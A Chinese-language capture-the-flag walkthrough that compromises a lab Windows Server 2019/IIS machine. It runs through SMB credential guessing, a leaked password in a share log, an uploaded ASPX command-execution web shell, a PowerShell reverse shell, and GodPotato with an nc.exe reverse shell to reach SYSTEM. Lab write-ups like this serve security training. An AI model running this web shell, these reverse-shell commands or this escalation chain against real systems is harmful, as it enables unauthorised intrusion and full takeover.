# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 11:14 EST
Nmap scan report for 192.168.21.8
Host is up (0.00042s latency).
MAC Address: 08:00:27:C0:1B:C8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.7
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.08 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.21.8
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 11:14 EST
Nmap scan report for 192.168.21.8
Host is up (0.0017s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Simple
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:C0:1B:C8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-07T16:27:06
|_  start_date: N/A
|_nbstat: NetBIOS name: SIMPLE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:c0:1b:c8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   1.74 ms 192.168.21.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 745.15 seconds
```

# 漏洞利用

445端口尝试匿名，被拒绝，晚点再看

```
┌──(kali㉿kali)-[~]
└─$ smbclient -L //192.168.21.8 -N
session setup failed: NT_STATUS_ACCESS_DENIED
```

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.8 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.8
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,png,zip,git,html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 161] [--> http://192.168.21.8/images/]                                                         
/index.html           (Status: 200) [Size: 1481]
/fonts                (Status: 301) [Size: 160] [--> http://192.168.21.8/fonts/]                                                          
/%5c                  (Status: 200) [Size: 1481]
/aspnet_client        (Status: 301) [Size: 168] [--> http://192.168.21.8/aspnet_client/]                                                  
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

看一下/%5c，这是\的URL编码

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.8/%5c                                 
<!DOCTYPE HTML>
<html lang="en">
<head>
        <title>Simple</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta charset="UTF-8">


        <!-- Font -->

        <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700%7CPoppins:400,500" rel="stylesheet">


        <link href="common-css/ionicons.css" rel="stylesheet">


        <link rel="stylesheet" href="common-css/jquery.classycountdown.css" />

        <link href="03-comming-soon/css/styles.css" rel="stylesheet">

        <link href="03-comming-soon/css/responsive.css" rel="stylesheet">

</head>
<body>

        <div class="main-area center-text" style="background-image:url(images/countdown-3-1600x900.jpg);">

                <div class="display-table">
                        <div class="display-table-cell">

                                <h1 class="title font-white"><b>Comming Soon</b></h1>
                                <p class="desc font-white">Our website is currently undergoing scheduled maintenance.
                                        Thanks to the work team: (ruy, marcos, lander, bogo, vaiper)</p>

                                <a class="notify-btn" href="#"><b>NOTIFY US</b></a>

                                <ul class="social-btn font-white">
                                        <li><a href="#">Facebook</a></li>
                                        <li><a href="#">Twitter</a></li>
                                        <li><a href="#">Google</a></li>
                                        <li><a href="#">Instagram</a></li>
                                </ul><!-- social-btn -->

                        </div><!-- display-table -->
                </div><!-- display-table-cell -->
        </div><!-- main-area -->

</body>
</html>
```

页面中出现：ruy, marcos, lander, bogo, vaiper，将其保存到user文件中，在对smb进行身份认证

```
┌──(kali㉿kali)-[~]
└─$ netexec smb 192.168.21.8 -u user -p user --ignore-pw-decoding
SMB         192.168.21.8    445    SIMPLE           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)                                                   
SMB         192.168.21.8    445    SIMPLE           [-] Simple\ruy:ruy STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\marcos:ruy STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\lander:ruy STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\bogo:ruy STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\vaiper:ruy STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\ruy:marcos STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\marcos:marcos STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\lander:marcos STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\bogo:marcos STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\vaiper:marcos STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\ruy:lander STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\marcos:lander STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\lander:lander STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\bogo:lander STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\vaiper:lander STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\ruy:bogo STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\marcos:bogo STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\lander:bogo STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\bogo:bogo STATUS_PASSWORD_EXPIRED
SMB         192.168.21.8    445    SIMPLE           [-] Simple\vaiper:bogo STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\ruy:vaiper STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\marcos:vaiper STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\lander:vaiper STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\bogo:vaiper STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\vaiper:vaiper STATUS_LOGON_FAILURE
```

由于Windows的配置导致用户 bob 的密码已过期，我们需要手动为其设置密码

```
选择热键-传入ctrl-alt-del
按esc进行返回
选择bogo用户
输入密码bogo
```

<img width="349" height="201" alt="图片" src="https://github.com/user-attachments/assets/9692abd1-f47e-4bf7-a133-6d4921f96e19" />

```
┌──(kali㉿kali)-[~]
└─$ netexec smb 192.168.21.8 -u user -p user --ignore-pw-decoding
SMB         192.168.21.8    445    SIMPLE           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)                                                   
SMB         192.168.21.8    445    SIMPLE           [-] Simple\ruy:ruy STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\marcos:ruy STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\lander:ruy STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\bogo:ruy STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\vaiper:ruy STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\ruy:marcos STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\marcos:marcos STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\lander:marcos STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\bogo:marcos STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\vaiper:marcos STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\ruy:lander STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\marcos:lander STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\lander:lander STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\bogo:lander STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\vaiper:lander STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\ruy:bogo STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\marcos:bogo STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [-] Simple\lander:bogo STATUS_LOGON_FAILURE
SMB         192.168.21.8    445    SIMPLE           [+] Simple\bogo:bogo
```

通过SMB看一下能访问哪些共享目录

```
┌──(kali㉿kali)-[~]
└─$ netexec smb 192.168.21.8 -u bogo -p bogo --shares
SMB         192.168.21.8    445    SIMPLE           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)                                                   
SMB         192.168.21.8    445    SIMPLE           [+] Simple\bogo:bogo
SMB         192.168.21.8    445    SIMPLE           [*] Enumerated shares
SMB         192.168.21.8    445    SIMPLE           Share           Permissions     Remark                                                
SMB         192.168.21.8    445    SIMPLE           -----           -----------     ------                                                
SMB         192.168.21.8    445    SIMPLE           ADMIN$                          Admin remota                                          
SMB         192.168.21.8    445    SIMPLE           C$                              Recurso predeterminado                                
SMB         192.168.21.8    445    SIMPLE           IPC$            READ            IPC remota                                            
SMB         192.168.21.8    445    SIMPLE           LOGS            READ                                                                  
SMB         192.168.21.8    445    SIMPLE           WEB
```

在LOGS中找到了日志文件，下载下来看一下

```
┌──(kali㉿kali)-[~]
└─$ smbclient //192.168.21.8/LOGS -U bogo
Password for [WORKGROUP\bogo]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Oct  8 17:23:36 2023
  ..                                  D        0  Sun Oct  8 17:23:36 2023
  20231008.log                        A     2200  Sun Oct  8 17:23:36 2023

                12966143 blocks of size 4096. 10890350 blocks available
smb: \> get 20231008.log
getting file \20231008.log of size 2200 as 20231008.log (1074.2 KiloBytes/sec) (average 1074.2 KiloBytes/sec)
smb: \> exit
┌──(kali㉿kali)-[~]
└─$ cat 20231008.log            
PS C:\> dir \\127.0.0.1\WEB
Acceso denegado
At line:1 char:1
+ dir \\127.0.0.1\WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\127.0.0.1\WEB:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
Cannot find path '\\127.0.0.1\WEB' because it does not exist.
At line:1 char:1
+ dir \\127.0.0.1\WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (\\127.0.0.1\WEB:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand

PS C:\> net use \\127.0.0.1\WEB
Se ha completado el comando correctamente.

PS C:\> dir \\127.0.0.1\WEB
Acceso denegado
At line:1 char:1
+ dir \\127.0.0.1\WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\127.0.0.1\WEB:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
Cannot find path '\\127.0.0.1\WEB' because it does not exist.
At line:1 char:1
+ dir \\127.0.0.1\WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (\\127.0.0.1\WEB:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand

PS C:\> net use \\127.0.0.1\WEB /user:marcos SuperPassword
Se ha completado el comando correctamente.

PS C:\> dir \\127.0.0.1\WEB

    Directorio: \\127.0.0.1\WEB

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/8/2023   9:46 PM                aspnet_client
-a----        9/26/2023   6:46 PM            703 iisstart.htm
-a----        10/8/2023  10:46 PM            158 test.php

PS C:\> rm \\127.0.0.1\WEB\*.php

PS C:\> dir \\127.0.0.1\WEB

    Directorio: \\127.0.0.1\WEB

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/8/2023   9:46 PM                aspnet_client
-a----        9/26/2023   6:46 PM            703 iisstart.htm

PS C:\>
```

发现了net use \\127.0.0.1\WEB /user:marcos SuperPassword

```
┌──(kali㉿kali)-[~]
└─$ smbclient //192.168.21.8/WEB -U marcos
Password for [WORKGROUP\marcos]:
session setup failed: NT_STATUS_PASSWORD_EXPIRED
```

因为配置，强制过期了，用bogo相同方法，设置marcos密码

```
┌──(kali㉿kali)-[~]
└─$ smbclient //192.168.21.8/WEB -U marcos
Password for [WORKGROUP\marcos]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Oct  8 11:14:24 2023
  ..                                  D        0  Sun Oct  8 11:14:24 2023
  03-comming-soon                     D        0  Sun Oct  8 17:22:15 2023
  aspnet_client                       D        0  Sun Oct  8 15:46:18 2023
  common-js                           D        0  Sun Oct  8 17:14:09 2023
  fonts                               D        0  Sun Oct  8 17:14:09 2023
  images                              D        0  Sun Oct  8 17:14:09 2023
  index.html                          A     1481  Sun Oct  8 17:26:47 2023

                12966143 blocks of size 4096. 10890305 blocks available
smb: \>
```

运行的是Microsoft IIS服务，有写的权限，也在网站根目录，我们可以写入一个aspx文件，触发RCE漏洞

```
<%@ Page Language="C#" %>
<%
if (Request["cmd"] != null)
{
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();

    string output = p.StandardOutput.ReadToEnd();
    Response.Write("<pre>" + output + "</pre>");
}
%>
smb: \> put shell.aspx 
putting file shell.aspx as \shell.aspx (416.0 kb/s) (average 416.0 kb/s)
```

<img width="583" height="134" alt="图片" src="https://github.com/user-attachments/assets/8c653b37-a19d-4ffc-a621-5455e0fef6ac" />

反弹一个shell

```
http://192.168.21.8/shell.aspx?cmd=powershell%20-nop%20-w%20hidden%20-c%20%22$client%3DNew-Object%20System.Net.Sockets.TCPClient('192.168.21.7'%2C4444)%3B$stream%3D$client.GetStream()%3B%5Bbyte%5B%5D%5D$bytes%3D0..65535%7C%25%7B0%7D%3Bwhile(($i%3D$stream.Read($bytes%2C0%2C$bytes.Length))%20-ne%200)%7B%3B$data%3D(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString($bytes%2C0%2C$i)%3B$sendback%3D(iex%20$data%202%3E%261%20%7C%20Out-String)%3B$sendback2%3D$sendback%2B'PS%20'%2B(pwd).Path%2B'%3E%20'%3B$sendbyte%3D(%5Btext.encoding%5D%3A%3AASCII).GetBytes($sendback2)%3B$stream.Write($sendbyte%2C0%2C$sendbyte.Length)%3B$stream.Flush()%7D%3B$client.Close()%22
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.21.7] from (UNKNOWN) [192.168.21.8] 49698
PS C:\windows\system32\inetsrv> ipconfig

Configuraci?n IP de Windows


Adaptador de Ethernet Ethernet:

   Sufijo DNS espec?fico para la conexi?n. . : 
   V?nculo: direcci?n IPv6 local. . . : fe80::7d09:2ef7:2242:ba0%5
   Direcci?n IPv4. . . . . . . . . . . . . . : 192.168.21.8
   M?scara de subred . . . . . . . . . . . . : 255.255.255.0
   Puerta de enlace predeterminada . . . . . : 192.168.21.1
```

# 权限提升

看一下有什么权限，拥有SeImpersonatePrivilege

```
PS C:\windows\system32\inetsrv> whoami /priv

INFORMACI?N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci?n                                       Estado       
============================= ================================================= =============
SeAssignPrimaryTokenPrivilege Reemplazar un s?mbolo (token) de nivel de proceso Deshabilitado
SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado
SeAuditPrivilege              Generar auditor?as de seguridad                   Deshabilitado
SeChangeNotifyPrivilege       Omitir comprobaci?n de recorrido                  Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n      Habilitada   
SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado
```

下载一个GodPotato上传

```
PS C:\windows\system32\inetsrv> certutil -urlcache -split -f http://192.168.21.7:8000/GodPotato-NET4.exe C:\Users\Public\Downloads\GodPotato-NET4.exe
****  En l?nea  ****
  0000  ...
  e000
CertUtil: -URLCache comando completado correctamente.
PS C:\windows\system32\inetsrv> C:\Users\Public\Downloads\GodPotato-NET4.exe -cmd "whoami"
[*] CombaseModule: 0x140723442352128
[*] DispatchTable: 0x140723444669680
[*] UseProtseqFunction: 0x140723444044960
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\6d551f1a-6f0e-4a07-9952-396a3be0090b\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00005402-05dc-ffff-9acb-6be9a8ac01ac
[*] DCOM obj OXID: 0x87115510007a24c3
[*] DCOM obj OID: 0xa17e274c2fbeebfb
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\Servicio de red
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 744 Token:0x836  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 240
nt authority\system
PS C:\windows\system32\inetsrv> C:\Users\Public\Downloads\GodPotato-NET4.exe -cmd "C:\Windows\System32\cmd.exe /c C:\Windows\Temp\nc.exe 192.168.21.7 5555 -e cmd.exe"
[*] CombaseModule: 0x140723442352128
[*] DispatchTable: 0x140723444669680
[*] UseProtseqFunction: 0x140723444044960
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\3082be62-37f9-414d-9a78-03576d7ac778\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000c802-0270-ffff-2cc7-4222d21255de
[*] DCOM obj OXID: 0x18effb54b1fb86e1
[*] DCOM obj OID: 0xff8a870c28d66083
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\Servicio de red
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 744 Token:0x836  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2372
"C:\Windows\Temp\nc.exe" no se reconoce como un comando interno o externo,
programa o archivo por lotes ejecutable.
```

确实成功了，但我们需要上传一个nc给反弹回来

```
PS C:\windows\system32\inetsrv> certutil -urlcache -split -f http://192.168.21.7:8000/nc.exe C:\Users\Public\Downloads\nc.exe
****  En l?nea  ****
  0000  ...
  96d8
CertUtil: -URLCache comando completado correctamente.
PS C:\windows\system32\inetsrv> dir C:\Users\Public\Downloads


    Directorio: C:\Users\Public\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       07/03/2026     19:04          57344 GodPotato-NET4.exe                                                    
-a----       07/03/2026     19:23          38616 nc.exe
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.21.7] from (UNKNOWN) [192.168.21.8] 49735
Microsoft Windows [Versi�n 10.0.17763.107]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

C:\windows\system32\inetsrv>whoami
whoami
nt authority\system
```
